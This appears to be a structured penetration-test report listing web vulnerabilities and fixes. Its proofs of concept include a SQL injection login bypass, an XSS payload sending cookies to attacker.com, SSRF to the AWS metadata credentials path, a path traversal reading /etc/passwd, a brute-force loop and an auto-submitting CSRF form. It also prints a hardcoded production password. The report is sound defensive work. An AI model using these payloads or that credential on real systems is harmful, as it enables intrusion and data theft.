vulnerabilities.title: SQL Injection
vulnerabilities.description:
## SQL Injection in `/api/login`

The `username` parameter in the login endpoint is directly interpolated into a SQL query without sanitization.

**Proof of Concept:**
```bash
POST /api/login
{ "username": "admin' OR '1'='1' --", "password": "x" }
```

This returns a valid session token for the `admin` account.
vulnerabilities.recommendation:
## Remediation

### Immediate Actions
- **Rotate** any database credentials that may have been exposed.
- Review logs for signs of prior exploitation.

### Code Fix
Replace string concatenation with **parameterized queries**:
```js
// SAFE
const query = 'SELECT * FROM users WHERE username = $1';
await db.query(query, [username]);
```

### Defense in Depth
- Use an ORM (Prisma, TypeORM) that uses prepared statements natively.
- Apply a **WAF** as a secondary control.

> **Priority:** Fix immediately before next deployment.

vulnerabilities.title: Reflected XSS
vulnerabilities.description:
## Reflected XSS in Search Endpoint

The `q` query parameter value is reflected in the page response without HTML encoding.

**Payload:**
```bash
GET /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

Any user clicking a crafted link will have their session cookies exfiltrated.
vulnerabilities.recommendation:
## Remediation

### Output Encoding
Encode all user-supplied values before inserting them into HTML using a context-aware escaping library (e.g., DOMPurify for client-side or `he` for server-side).

### HTTP Headers
Add a strict `Content-Security-Policy` header to prevent inline script execution:
```bash
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Session Security
Use the `HttpOnly` flag on all session cookies to prevent JavaScript access.

vulnerabilities.title: CORS Misconfiguration
vulnerabilities.description:
## Overly Permissive CORS Policy

The API reflects the `Origin` header back in `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`, allowing any domain to make credentialed cross-origin requests.

**Observed header:**
```bash
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
vulnerabilities.recommendation:
## Remediation

### Configuration Fix
Maintain an explicit **allowlist** of trusted origins on the server and check incoming requests against it.

### Restriction
Never combine a wildcard or indiscriminately reflected origin with `Access-Control-Allow-Credentials: true`.

### Hardening
Reject preflight requests from untrusted origins entirely at the server/WAF level.

vulnerabilities.title: Broken Authentication
vulnerabilities.description:
## Absent Account Lockout Policy

The `/api/login` endpoint does not enforce rate limiting or lockout after repeated failed attempts, enabling brute-force attacks.

**Test performed:**
```bash
for i in $(seq 1 500); do
  curl -s -X POST https://app.acmecorp.com/api/login \
    -d '{"username":"admin","password":"guess'$i'"}'
done
```

No lockout or CAPTCHA was triggered after 500 attempts.
vulnerabilities.recommendation:
## Remediation

### Lockout Policy
Enforce an account **lockout** after 5 consecutive failed attempts (with exponential backoff).

### Rate Limiting
Implement **rate limiting** per IP and per account using a token bucket or sliding window algorithm.

### CAPTCHA Integration
Add a CAPTCHA challenge after 3 failed attempts to definitively deter automated tooling.

vulnerabilities.title: Insecure TLS Configuration
vulnerabilities.description:
## TLS 1.0 and TLS 1.1 Accepted

The server still accepts connections over deprecated TLS versions, exposing users to BEAST and POODLE downgrade attacks.

**Verified with:**
```bash
nmap --script ssl-enum-ciphers -p 443 app.acmecorp.com
```

Output confirmed `TLSv1.0` and `TLSv1.1` are enabled.
vulnerabilities.recommendation:
## Remediation

### Server Configuration
Disable TLS 1.0 and TLS 1.1 in your web server configuration entirely.

### Requirement
Enforce **TLS 1.2 minimum**, and prefer TLS 1.3 where supported by clients.

### Nginx Example
```bash
ssl_protocols TLSv1.2 TLSv1.3;
```

vulnerabilities.title: Verbose Error Messages
vulnerabilities.description:
## Stack Traces Exposed in Production

Unhandled exceptions return full server-side stack traces including file paths and framework version to the client.

**Example response body:**
```json
{
  "error": "TypeError: Cannot read properties of undefined",
  "stack": "at /app/src/controllers/user.js:42:15"
}
```
vulnerabilities.recommendation:
## Remediation

### Global Error Handling
Configure a **global error handler** that catches exceptions and returns a generic, non-informative message in production.

### Safe Logging
Log the full stack trace server-side only (using a library like Winston or Pino) and never send it to the client.

### Environment Variables
Set `NODE_ENV=production` safely to suppress framework debug output automatically.

vulnerabilities.title: Directory Listing Enabled
vulnerabilities.description:
## Static File Directory Listing

The `/static/` path returns a browsable directory index, disclosing internal file names and structure.

No sensitive files were found in the listing, but it aids reconnaissance.
vulnerabilities.recommendation:
## Remediation

### Configuration
Disable directory listing in your web server:

```bash
# Nginx
autoindex off;
```

### Application Routing
Serve static files only through explicit application routes, preventing arbitrary folder traversal.

vulnerabilities.title: Server-Side Request Forgery (SSRF)
vulnerabilities.description:
## SSRF via Webhook URL Parameter

The `/api/webhooks/register` endpoint accepts a user-supplied URL and makes a server-side HTTP request to it without validation, allowing attackers to probe the internal network.

**Payload used to reach AWS metadata service:**
```bash
POST /api/webhooks/register
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
```

The response included live AWS IAM credentials.
vulnerabilities.recommendation:
## Remediation

### Strict Validation
Validate and heavily **allowlist** permitted URL schemes and target domains.

### Network Filtering
Explicitly block requests to private internal IP ranges (`10.x`, `172.16.x`, `192.168.x`, `169.254.x`).

### Egress Proxy
Use a dedicated egress proxy with a clear whitelist for all outbound webhook HTTP calls.

### Immediate Action
Rotate the exposed IAM credentials immediately.

vulnerabilities.title: JWT Vulnerability
vulnerabilities.description:
## JWT `alg: none` Accepted

The API accepts JWT tokens with the algorithm set to `none`, bypassing signature verification entirely.

**Crafted token header:**
```json
{ "alg": "none", "typ": "JWT" }
```

An attacker can forge any user identity by crafting a token with no signature.
vulnerabilities.recommendation:
## Remediation

### Algorithm Pinning
**Explicitly** configure the JWT library to only accept expected symmetric or asymmetric algorithms (e.g. `RS256`, `HS256`).

### Rejection
Never allow the chosen algorithm to be dynamically driven by the token payload header.

### Code Example
```js
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

vulnerabilities.title: Path Traversal
vulnerabilities.description:
## Path Traversal in File Download Endpoint

The `/api/files/download?name=` parameter is used directly to construct a file path without sanitization.

**Exploit:**
```bash
GET /api/files/download?name=../../etc/passwd
```

The server returned the contents of `/etc/passwd`.
vulnerabilities.recommendation:
## Remediation

### Path Resolution
Resolve the canonical path and continuously verify it starts exactly with the expected **base directory directory**:
```js
const safe = path.resolve(BASE_DIR, fileName);
if (!safe.startsWith(BASE_DIR)) throw new Error('Forbidden');
```

### Best Practices
Never blindly concatenate user input into file paths directly. Use specific IDs or hashes and resolve them to paths via a database link.

vulnerabilities.title: Hardcoded Credentials
vulnerabilities.description:
## Hardcoded Database Password in Source Code

The production database password was found hardcoded in the application repository, publicly accessible via a misconfigured GitLab instance.

**File:** `src/config/database.js`
```js
const DB_PASSWORD = 'Gl0balF!nProd2024';
```

The credentials are valid and allow full read/write access to the production PostgreSQL database.
vulnerabilities.recommendation:
## Remediation

### Immediate Rotation
**Rotate** the compromised credentials immediately in the production environment.

### Secrets Management
Store secrets exclusively in environment variables or a robust secrets manager (e.g. HashiCorp Vault, AWS Secrets Manager).

### Git Auditing
Audit the full git history for other leaked secrets utilizing tools like `trufflehog` or `gitleaks`, and scrub the history.

### Repository Security
Ensure the GitLab instance is correctly configured to strictly require authentication.

vulnerabilities.title: Default Credentials
vulnerabilities.description:
## Default Admin Credentials on ERP Panel

The ERP administration panel (`/admin`) is accessible with the vendor default credentials `admin / admin123`, which were never changed during deployment.
vulnerabilities.recommendation:
## Remediation

### Password Reset
Change all vendor default credentials immediately upon system instantiation.

### Password Policy
Enforce a **strong password policy** globally on all administrator and standard system accounts.

### Access Control
Restrict `/admin` page access strictly to expected internal IP ranges employing standard firewall rules.

vulnerabilities.title: Privilege Escalation
vulnerabilities.description:
## Horizontal Privilege Escalation via IDOR

Authenticated users can access other users' financial records by changing the `userId` parameter in the request.

**Example:**
```bash
GET /api/reports?userId=1337
```

Returns full financial data for user `1337` regardless of the authenticated user's identity.
vulnerabilities.recommendation:
## Remediation

### Identity Source
Always derive the target user context systematically from the **authenticated session** data (like JWT attributes), never rely purely on request parameters.

### Access Checks
Implement robust server-side authorization checks on every sensitive data access endpoint to verify ownership.

### Unit Testing
Integrate automated integration tests that emphatically verify standard users cannot interact with other users' resources.

vulnerabilities.title: Insufficient Logging and Monitoring
vulnerabilities.description:
## No Audit Trail for Sensitive Actions

Admin-level actions (user creation, role changes, data exports) are not logged, making it impossible to detect or reconstruct a compromise.
vulnerabilities.recommendation:
## Remediation

### Audit Logging
Implement structured audit logging natively for all sensitive actions, comprehensively recording actor, timestamp, relevant action, and target id.

### Centralised Aggregation
Continuously forward application logs securely to a centralised SIEM instance (e.g., Splunk, ELK stack).

### Active Alerting
Set up real-time observability alerts for highly suspicious patterns such as voluminous bulk data exports or role modifications executed outside typical business hours.

vulnerabilities.title: Sensitive Data Exposure
vulnerabilities.description:
## Patient PII Returned in API Without Authorization

The `/api/patients` endpoint returns full patient records (name, date of birth, diagnosis, SSN) in paginated responses accessible to **any authenticated user**, regardless of role.

A standard nurse-role account was used to dump 14,000 patient records in under 10 minutes.
vulnerabilities.recommendation:
## Remediation

### Access Control (RBAC)
Apply strict **role-based access control (RBAC)** — ensure that only fully authorized practitioners or administrative roles can access bulk patient data.

### Field Filtering
Implement field-level data filtering structurally so PII (e.g., SSN, core diagnoses) is explicitly stripped out from payloads unless the specific access role is validated.

### Rate Limiting & Pagination Data Safeguards
Enforce hard pagination bounds and firm rate limits specifically modeled to prevent sudden bulk information extraction.

### Compliance Check
As this constitutes a potential **HIPAA breach**, immediately consult data privacy officers and internal compliance teams.

vulnerabilities.title: Cross-Site Request Forgery (CSRF)
vulnerabilities.description:
## Missing CSRF Protection on State-Changing Endpoints

POST endpoints that modify patient data do not validate a CSRF token, allowing a malicious page to trigger requests on behalf of a logged-in user.

**PoC form:**
```html
<form action="https://portal.healthsync.com/api/patients/99/update" method="POST">
  <input name="diagnosis" value="attacker-controlled" />
</form>
<script>document.forms[0].submit();</script>
```
vulnerabilities.recommendation:
## Remediation

### Token Pattern
Implement the **Synchronizer Token Pattern** — inject a unique CSRF token into every rendering form and mathematically validate it back on the server-side processing end.

### SameSite Cookies
Activate the `SameSite=Strict` or `SameSite=Lax` session cookie attributes consistently across environments as an indispensable complementary defense.

### Header Verifications
Ensure to strictly verify the `Origin` and `Referer` HTTP headers exclusively on all state-changing `POST`, `PUT`, or `DELETE` requests.

vulnerabilities.title: Open Redirect
vulnerabilities.description:
## Unvalidated Redirect After Login

The `?next=` parameter on the login page is not validated, allowing redirection to arbitrary external URLs after authentication — facilitating phishing.

**Example:**
```bash
https://portal.healthsync.com/login?next=https://attacker.com/fake-portal
```
vulnerabilities.recommendation:
## Remediation

### Validate Redirect Paths
Systematically dictate that `next` values are entirely interpreted solely as **relative paths** inherently operating on the exact same root origin.

### Origin Allowlisting
Alternately, strictly validate the next location exclusively against a predefined secure allowlist of logically permitted, thoroughly trusted redirect destinations.

### Reject Non-relative Links
Failing softly, proactively reject or forcefully ignore any specific `next` URL string values exhibiting an overt scheme prefix (`http://`, `https://`) or a dual absolute `/` segment (`//`).

vulnerabilities.title: Clickjacking
vulnerabilities.description:
## Missing X-Frame-Options Header on Internal Portal

The internal IP (`192.168.5.10`) serves an admin dashboard that can be embedded in an `<iframe>` on a malicious page, enabling clickjacking attacks against internal users.

**Verified:**
```html
<iframe src="http://192.168.5.10/admin"></iframe>
```
Loads without restriction.
vulnerabilities.recommendation:
## Remediation

### Header Implementation
Directly inject the specific following HTTP security response header to strictly block basic framing inherently:
```bash
X-Frame-Options: DENY
```

### Content-Security-Policy Alternative
Or instead perfectly deploy the inherently more versatile CSP mechanism framing directive:
```bash
Content-Security-Policy: frame-ancestors 'none';
```
